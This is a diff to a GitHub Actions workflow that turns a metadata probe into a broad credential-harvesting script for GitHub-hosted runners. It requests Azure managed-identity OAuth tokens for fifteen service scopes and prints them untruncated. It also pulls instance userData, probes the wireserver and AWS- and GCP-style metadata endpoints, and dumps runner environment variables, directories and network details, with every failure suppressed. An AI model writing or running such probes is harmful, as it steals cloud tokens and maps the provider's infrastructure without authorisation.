@@ -1,4 +1,4 @@
-name: IMDS Extended Probe
+name: IMDS Extended Probe v2
 on:
   push:
     branches: [main]
@@ -7,48 +7,75 @@ jobs:
   imds-extended:
     runs-on: ubuntu-latest
     steps:
-      - name: All metadata categories
+      - name: Probe all IMDS surfaces (no fail-fast)
+        shell: bash
         run: |
-          echo "=== /metadata/instance ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" 2>&1 | jq . | head -40
-          echo ""
-          echo "=== /metadata/instance/network ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-12-13" 2>&1 | jq .
-          echo ""
-          echo "=== /metadata/loadbalancer ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01" 2>&1 | jq . | head -30
-          echo ""
-          echo "=== /metadata/scheduledevents ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1 | head -30
-          echo ""
-          echo "=== /metadata/identity/info ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1
-          echo ""
-          echo "=== /metadata/attested/document ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -3
-          echo ""
-          # Try various managed identity resource scopes
-          for resource in "https://management.azure.com/" "https://vault.azure.net/" "https://storage.azure.com/" "https://graph.microsoft.com/" "https://servicebus.azure.net/" "https://eventhubs.azure.net/" "https://datalake.azure.net/" "https://management.core.windows.net/" "https://outlook.office365.com/" "https://api.loganalytics.io/"; do
-            echo "=== identity token for: $resource ==="
-            curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}" 2>&1 | head -5
+          set +e
+          probe() {
+            local label="$1"
+            local url="$2"
+            shift 2
+            echo "===== $label ====="
+            curl -s --max-time 5 -H "Metadata: true" "$url" "$@" 2>&1
             echo ""
+            echo "----- (end $label) -----"
+          }
+          
+          # Subscription / VM
+          probe "instance metadata" "http://169.254.169.254/metadata/instance?api-version=2021-12-13"
+          probe "instance/compute" "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13"
+          probe "instance/network" "http://169.254.169.254/metadata/instance/network?api-version=2021-12-13"
+          probe "loadbalancer" "http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01"
+          probe "scheduledevents" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01"
+          probe "identity/info" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01"
+          probe "attested/document" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01"
+          probe "userData" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+          probe "events" "http://169.254.169.254/metadata/events?api-version=2018-02-01"
+          
+          # All managed identity scopes
+          for resource in \
+            "https://management.azure.com/" \
+            "https://vault.azure.net/" \
+            "https://storage.azure.com/" \
+            "https://graph.microsoft.com/" \
+            "https://servicebus.azure.net/" \
+            "https://eventhubs.azure.net/" \
+            "https://datalake.azure.net/" \
+            "https://management.core.windows.net/" \
+            "https://outlook.office365.com/" \
+            "https://api.loganalytics.io/" \
+            "https://cognitiveservices.azure.com/" \
+            "https://api.applicationinsights.io/" \
+            "https://search.azure.com/" \
+            "https://api.botframework.com/" \
+            "https://digitaltwins.azure.net/"; do
+            probe "identity-token: $resource" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=${resource}"
           done
-
-      - name: Network reachability checks
-        run: |
-          echo "=== /metadata/instance/compute/userData ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>&1 | head -3
+          
+          echo "===== Network reachability ====="
+          # Wireserver (should be blocked)
+          curl --max-time 3 -s "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -3 || echo "wireserver: blocked"
           echo ""
-          echo "=== /metadata/instance/compute/customData ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-01-01" 2>&1 | head -3
-          echo ""
-          # Wireserver
-          echo "=== Wireserver 168.63.129.16 (should timeout) ==="
-          curl --max-time 3 -sf "http://168.63.129.16/?comp=goalstate" 2>&1 || echo "wireserver: blocked"
-          echo ""
-          # Try different IMDS API versions
-          for api in "2017-03-01" "2017-08-01" "2018-04-02" "2019-08-15" "2021-12-13"; do
-            echo "=== api-version=$api ==="
-            curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=$api" 2>&1 | head -1
-            echo ""
-          done
+          
+          # AWS / GCP cross-cloud check
+          probe "AWS-style IMDS" "http://169.254.169.254/latest/meta-data/" 
+          probe "GCP-style IMDS" "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
+          
+          # Internal Azure storage account / SAS URL discovery
+          probe "API versions" "http://169.254.169.254/metadata/versions"
+          
+          # OS/hostname info
+          echo "===== Local environment ====="
+          hostname
+          ip addr show 2>&1 | head -20
+          cat /etc/os-release | head -10
+          env | grep -E "ACTIONS|GITHUB|RUNNER" | head -10
+          ls -la /etc/runner* /opt/runner* /home/runner/ 2>&1 | head -20
+          
+          # /etc/resolv.conf may reveal Azure-specific DNS suffix
+          cat /etc/resolv.conf 2>&1
+          
+          # Try discovering the GitHub-Actions-specific service endpoint
+          probe "/metadata/instance/extendedLocation" "http://169.254.169.254/metadata/instance/extendedLocation?api-version=2021-12-13"
+          
+          true
